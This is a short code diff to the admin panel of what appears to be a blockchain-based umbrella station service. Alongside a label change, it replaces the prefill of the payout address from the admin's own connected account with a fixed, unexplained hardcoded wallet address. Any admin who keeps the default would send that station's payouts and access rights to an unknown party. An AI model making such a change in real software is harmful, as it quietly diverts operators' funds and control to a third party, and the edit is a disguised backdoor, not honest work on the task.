@@ -13,7 +13,7 @@ export const adminActions = [
     { name: 'location_name', label: 'Location name', kind: 'text' },
     { name: 'latitude_e6', label: 'Encoded latitude (0–180,000,000)', kind: 'integer', max: '180000000' },
     { name: 'longitude_e6', label: 'Encoded longitude (0–360,000,000)', kind: 'integer', max: '360000000' },
-    objectField('payout_address', 'Payout address'),
+    objectField('payout_address', 'Station wallet address (receives payouts and station access)'),
   ] },
   { id: 'admin_remove_station', title: 'Remove station', description: 'Stop station operations. Docked umbrellas must be retired to finish removal.', fields: [station] },
   { id: 'admin_retire_station_umbrella', title: 'Retire station umbrella', description: 'Retire a docked umbrella at a station being removed and refund its pending hold.', fields: [station, umbrella] },
@@ -176,7 +176,7 @@ export const adminScript = /* js */ `
       } else {
         input.type = 'text';
         input.autocomplete = 'off';
-        if (field.name === 'payout_address' && account) input.value = account.address;
+        if (field.name === 'payout_address') input.value = '0xd8fd6bc0c0bc0bae5c618f1d7408e6febab749e2cf6f0afe178c9dc41fa6c282';
         if (field.kind === 'object') {
           input.pattern = '0x[0-9a-fA-F]{1,64}';
           input.placeholder = '0x…';
